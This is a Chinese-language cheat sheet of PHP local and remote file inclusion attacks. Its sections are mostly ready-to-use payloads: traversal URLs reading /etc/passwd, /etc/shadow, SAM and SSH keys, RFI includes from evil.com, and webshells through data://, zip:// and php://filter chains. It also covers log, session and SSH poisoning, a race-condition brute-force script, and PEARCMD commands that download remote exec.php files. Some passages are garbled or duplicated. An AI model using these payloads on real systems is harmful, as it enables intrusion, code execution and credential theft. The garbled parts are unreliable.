# 文件包含漏洞

> 文件包含漏洞指的是Web应用程序中的一种安全漏洞，在PHP开发的应用程序中尤为普遍。攻击者可以通过这种漏洞包含一个文件，通常是通过利用输入/输出消毒措施的缺失。这种漏洞可能导致一系列恶意活动，包括代码执行、数据窃取和网站篡改。

**文件包含漏洞**应与**路径遍历**区分开来。路径遍历漏洞允许攻击者访问文件，通常是利用目标应用程序中实现的“读取”机制，而文件包含则会导致任意代码的执行。

## 摘要

- 文件包含
  - 摘要
  - 工具
  - 本地文件包含
    - 空字节
    - 双重编码
    - UTF-8编码
    - 路径和点截断
    - 过滤器绕过技巧
  - 远程文件包含
    - 空字节
    - 双重编码
    - 绕过allow_url_include
  - 使用包装器的LFI / RFI
    - 包装器php://filter
    - 包装器data://
    - 包装器expect://
    - 包装器input://
    - 包装器zip://
    - 包装器phar://
    - 包装器convert.iconv:// 和 dechunk://
  - 通过/proc/*/fd从LFI到RCE
  - 通过/proc/self/environ从LFI到RCE
  - 通过上传从LFI到RCE
  - 通过上传（竞赛）从LFI到RCE
  - 通过上传（FindFirstFile）从LFI到RCE
  - 通过phpinfo()从LFI到RCE
  - 通过受控日志文件从LFI到RCE
    - 通过SSH实现RCE
    - 通过邮件实现RCE
    - 通过Apache日志实现RCE
  - 通过PHP会话从LFI到RCE
  - 通过PHP PEARCMD从LFI到RCE
  - 通过凭证文件从LFI到RCE
  - 参考资料

## 工具

- Kadimus - https://github.com/P0cL4bs/Kadimus
- LFISuite - https://github.com/D35m0nd142/LFISuite
- fimap - https://github.com/kurobeats/fimap
- panoptic - https://github.com/lightos/Panoptic

## 本地文件包含

考虑一个基于用户输入包含文件的PHP脚本。如果没有适当的消毒措施，攻击者可以操纵`page`参数来包含本地或远程文件，导致未经授权的访问或代码执行。

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

在以下示例中，我们包含了`/etc/passwd`文件，有关更多有趣文件，请查看`目录和路径遍历`章节。

```powershell
http://example.com/index.php?page=../../../etc/passwd
```

### 空字节

:warning: 在PHP 5.3.4以下的版本中，我们可以用空字节终止。

```
http://example.com/index.php?page=../../../etc/passwd%00
```

## 双重编码

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### UTF-8 编码

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

### 路径和点截断

在大多数PHP安装中，文件名超过`4096`字节将被截断，因此任何多余的字符将被丢弃。

```powershell
http://example.com/index.php?page=../../../etc/passwd............[添加更多]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[添加更多]
http://example.com/index.php?page=../../../etc/passwd/./././././.[添加更多] 
http://example.com/index.php?page=../../../[添加更多]../../../../etc/passwd
```

### 过滤器绕过技巧

```powershell
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

## 远程文件包含

> 远程文件包含（RFI）是一种漏洞类型，当应用程序包含远程文件时发生，通常通过用户输入，没有正确验证或清理输入。

由于`allow_url_include`在PHP5起默认被禁用，远程文件包含不再起作用。

```ini
allow_url_include = On
```

LFI部分的大多数过滤器绕过可以重用于RFI。

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

### 空字节

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

### 双重编码

```powershell
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### 绕过 allow_url_include

当`allow_url_include`和`allow_url_fopen`设置为`Off`时，仍然可以使用`smb`协议在Windows机器上包含远程文件。

1. 创建一个对所有人开放的共享
2. 在文件中写入PHP代码：`shell.php`
3. 包含它`http://example.com/index.php?page=\\10.0.0.1\share\shell.php`

## 使用包装器的LFI / RFI

### 包装器 php://filter

"`php://filter`"部分是大小写不敏感的

```powershell
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

包装器可以通过压缩包装器链接起来，用于大文件。

```powershell
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

注意：包装器可以使用`|`或`/`多次链接：

- 多次base64解码：`php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
- 压缩然后`base64编码`（适用于有限字符泄露）：`php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`

```powershell
./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
```

还有一种方法可以将`php://filter`转换为完整的RCE。

- synacktiv/php_filter_chain_generator - 一个CLI工具，用于生成PHP过滤器链

```powershell
$ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
[+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

* [LFI2RCE.py](./LFI2RCE.py) 生成自定义payload

  ```powershell
  # vulnerable file: index.php
  # vulnerable parameter: file
  # executed command: id
  # executed PHP code: <?=`$_GET[0]`;;?>
  curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd"
  ```



### 包装器 data://

```powershell
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
注意：有效载荷是 "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

趣事：你可以通过以下方式触发XSS并绕过Chrome审计器：`http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

### 包装器 expect://

```powershell
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

### 包装器 input://

在POST参数中指定您的有效载荷，这可以通过简单的`curl`命令完成。

```powershell
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

另外，Kadimus有一个模块可以自动化这种攻击。

```powershell
./kadimus -u "https://example.com/index.php?page=php://input%00"  -C '<?php echo shell_exec("id"); ?>' -T input
```

### 包装器 zip://

1. 创建恶意有效载荷：`echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;`
2. 压缩文件

~~~python
压缩文件
```python
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php
~~~

1. 上传存档并通过包装器访问文件：http://example.com/index.php?page=zip://shell.jpg%23payload.php

### 包装器 phar://

创建一个包含序列化对象在其元数据中的phar文件。

```php
// 创建新的Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// 将任何类的对象添加为元数据
class AnyClass {}
$object = new AnyClass;
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();
```

如果现在对我们的现有Phar文件执行文件操作（通过phar://包装器），则其序列化的元数据将被反序列化。如果此应用程序有一个名为AnyClass的类，并且它定义了魔术方法__destruct()或__wakeup()，那么这些方法将自动调用

```php
class AnyClass {
    function __destruct() {
        echo $this->data;
    }
}
// 输出：rips
include('phar://test.phar');
```

注意：对于phar://包装器，在任何文件操作中都会触发反序列化，`file_exists`和许多其他操作。

### 包装器 convert.iconv:// 和 dechunk://

- `convert.iconv://`：将输入转换为另一个文件夹（`convert.iconv.utf-16le.utf-8`）
- `dechunk://`：如果字符串不包含换行符，只有当字符串以A-Fa-f0-9开头时，才会清除整个字符串

这种利用的目的是基于DownUnderCTF的writeup，一次泄露文件的内容，一个字符一个字符地。

**要求**：

- 后端不得使用`file_exists`或`is_file`。

- 易受攻击的参数应该在

  ```
  POST
  ```

  请求中。

  - 由于大小限制，您无法在GET请求中泄露超过135个字符

利用链基于PHP过滤器：`iconv`和`dechunk`：

1. 使用`iconv`过滤器和一个使数据大小呈指数级增长的编码来触发内存错误。
2. 使用`dechunk`过滤器根据之前的错误确定文件的第一个字符。
3. 再次使用具有不同字节顺序的编码的`iconv`过滤器，将剩余字符与第一个字符交换。

使用synacktiv/php_filter_chains_oracle_exploit，脚本将使用`HTTP状态代码：500`或时间作为基于错误的oracle来确定字符。

```ps1
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
[*] 以下URL被定位：http://127.0.0.1
[*] 以下本地文件被泄露：/test
[*] 运行POST请求
[+] 文件/测试泄露完成！
```



## 通过/proc/*/fd从本地文件包含（LFI）到远程代码执行（RCE）

1. 上传大量shell（例如：100个）
2. 包含http://example.com/index.php?page=/proc/𝑃𝐼𝐷/𝑓𝑑/*P**I**D*/*fd*/FD，其中𝑃𝐼𝐷为进程𝐼𝐷（可以暴力破解），*P**I**D*为进程*I**D*（可以暴力破解），FD为文件描述符（也可以暴力破解）

## 通过/proc/self/environ从LFI到RCE

像日志文件一样，在User-Agent中发送有效载荷，它将在/proc/self/environ文件中反映出来。

```powershell
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

## 通过上传实现从LFI到RCE

如果你可以上传文件，只需在其中注入shell有效载荷（例如：`<?php system($_GET['c']); ?>`）。

```powershell
http://example.com/index.php?page=path/to/uploaded/file.png
```

为了保持文件的可读性，最好将其注入图片/文档/PDF的元数据中。

## 通过上传（竞争条件）实现从LFI到RCE

- 上传一个文件并触发自我包含。
- 重复上传大量次数以：
- 增加我们赢得竞争的机会
- 增加我们的猜测机会
- 暴力破解包含/tmp/[0-9a-zA-Z]{6}
- 享受我们的shell。

```python
import itertools
import requests
import sys

print('[+] 尝试赢得竞争')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)

print('[+] 暴力破解包含')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] 我们获得了一个shell：' + url)
        sys.exit(0)

print('[x] 出了点问题，请再试一次')
```

## 通过上传（FindFirstFile）实现从LFI到RCE

:warning: 仅在Windows上有效

`FindFirstFile`允许在Windows上的LFI路径中使用掩码（`<<` 作为 `*` 和 `>` 作为 `?`）。掩码本质上是一个搜索模式，可以包括通配符字符，允许用户或开发者基于部分名称或类型搜索文件或目录。在FindFirstFile的上下文中，掩码用于过滤和匹配文件或目录的名称。

- `*`/`<<` : 代表任意字符序列。
- `?`/`>` : 代表任意单个字符。

上传一个文件，它应该存储在临时文件夹`C:\Windows\Temp\`中，生成类似`php[A-F0-9]{4}.tmp`的名称。然后要么暴力破解65536个文件名，要么使用通配符字符，例如：`http://site/vuln.php?inc=c:\windows\temp\php<<`

## 通过phpinfo()实现从LFI到RCE

PHPinfo()显示任何变量的内容，如**𝐺𝐸𝑇∗∗、∗∗*G**ET*∗∗、∗∗_POST**和**$_FILES**。

> 通过对PHPInfo脚本进行多次上传帖子，并仔细控制读取操作，可以检索临时文件的名称，并向LFI脚本发出请求，指定临时文件名。

使用脚本phpInfoLFI.py

研究来自https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf

## 通过控制日志文件实现从LFI到RCE

只需通过向服务（Apache、SSH等）发起请求，将您的PHP代码追加到日志文件中，并包含日志文件即可。

```powershell
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

### 通过SSH实现RCE

尝试使用PHP代码作为用户名通过SSH登录到盒子`<?php system($_GET["cmd"]);?>`。

```powershell
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

然后在Web应用程序中包含SSH日志文件。

```powershell
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

### 通过邮件实现RCE

首先使用开放的SMTP发送电子邮件，然后包含位于`http://example.com/index.php?page=/var/log/mail`的日志文件。

```powershell
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

在某些情况下，您还可以使用`mail`命令行发送电子邮件。

```powershell
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```

### 通过Apache日志实现RCE

在访问日志中投毒User-Agent：

```markdown
$ curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

注意：日志会转义双引号，因此在PHP有效载荷中使用单引号作为字符串。

然后通过LFI请求日志并执行您的命令。

```markdown
$ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```

## 通过PHP会话实现从LFI到RCE

检查网站是否使用PHP会话（PHPSESSID）

```javascript
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

在PHP中，这些会话存储在/var/lib/php5/sess_[PHPSESSID]或/var/lib/php/sessions/sess_[PHPSESSID]文件中

```javascript
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

将会话设置为`<?php system('cat /etc/passwd');?>`

```powershell
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

使用LFI包含PHP会话文件

```powershell
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

## 通过PHP PEARCMD实现从LFI到RCE

PEAR是用于可重用PHP组件的框架和分发系统。默认情况下，`pearcmd.php`安装在Docker PHP镜像的每个hub.docker.com中的/usr/local/lib/php/pearcmd.php。

`pearcmd.php`文件使用`$_SERVER['argv']`获取其参数。此攻击要工作，必须在PHP配置（`php.ini`）中将`register_argc_argv`指令设置为`On`。

```ini
register_argc_argv = On
```

有几种方法可以利用它。

- 方法1：config create

  ```ps1
  /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
  /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
  ```

- 方法2：man_dir

  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
  /vuln.php?file=/tmp/exec.php&c=id
  ```

  创建的配置文件包含webshell。

  ```php
  #PEAR_Config 0.9
  a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
  ```

- 方法3：download

  需要外部网络连接。

  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
  /vuln.php?file=exec.php&c=id
  ```

- 方法4：install

  需要外部网络连接。

  注意`exec.php`位于`/tmp/pear/download/exec.php`。

  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
  /vuln.php?file=/tmp/pear/download/exec.php&c=id
  ```



1. **Method 2: man_dir**：此方法通过创建包含webshell的配置文件实现攻击。

   - 攻击步骤：

     1. 通过访问`/vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+`，创建配置文件。
     2. 接着，通过访问`/vuln.php?file=/tmp/exec.php&c=id`执行系统命令。

   - 配置文件示例：

     ```php
     #PEAR_Config 0.9
     a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
     ```

2. **Method 3: download**：需要外部网络连接。

   - 攻击步骤：
     1. 通过访问`/vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php`下载并执行恶意文件。
     2. 然后，通过访问`/vuln.php?file=exec.php&c=id`执行系统命令。

3. **Method 4: install**：需要外部网络连接。

   - 攻击步骤：
     1. 通过访问`/vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php`安装恶意文件，注意`exec.php`位于`/tmp/pear/download/exec.php`。
     2. 接着，通过访问`/vuln.php?file=/tmp/pear/download/exec.php&c=id`执行系统命令。

4. **通过凭证文件从LFI到RCE**：该方法需要在应用程序内拥有高权限以读取敏感文件。

   - Windows版本操作步骤：
     1. 提取`sam`和`system`文件。
     2. 使用`samdump2 SYSTEM SAM > hashes.txt`从这些文件中提取哈希，并使用`hashcat/john`破解它们或使用Pass The Hash技术重放它们。
   - Linux版本操作步骤：
     1. 提取`/etc/shadow`文件。
     2. 破解其中的哈希值，以便通过SSH登录机器。



## 通过凭证文件从本地文件包含（LFI）到远程代码执行（RCE）

此方法需要在应用程序内具有高级权限才能读取敏感文件。

### Windows版本

首先提取`sam`和`system`文件。

```powershell
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

然后使用`samdump2 SYSTEM SAM > hashes.txt`从这些文件中提取哈希值，并使用`hashcat/john`破解它们，或者通过传递哈希技术重放它们。

### Linux版本

首先提取`/etc/shadow`文件。

```powershell
http://example.com/index.php?page=../../../../../../etc/shadow
```

然后破解其中的哈希值以便通过SSH登录机器。

另一种通过LFI获得Linux机器SSH访问权限的方法是通过读取私钥文件id_rsa。如果SSH处于活动状态，请检查正在使用哪个用户`/proc/self/status`和`/etc/passwd`，然后尝试访问`/<HOME>/.ssh/id_rsa`。

## 参考资料

- [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
- [HighOn.coffee LFI Cheat](https://highon.coffee/blog/lfi-cheat-sheet/)
- [Turning LFI to RFI](https://www.linkedin.cn/incareer/in/graysonchristopher/)
- [Is PHP vulnerable and under what conditions?](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
- [Upgrade from LFI to RCE via PHP Sessions](https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)
- [Local file inclusion tricks](http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)
- [CVV #1: Local File Inclusion - SI9INT](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
- [Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos](https://web.archive.org/web/20200919055801/http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
- [Baby^H Master PHP 2017 by @orangetw](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
- [Чтение файлов => unserialize !](https://web.archive.org/web/20200809082021/https://rdot.org/forum/showthread.php?t=4379)
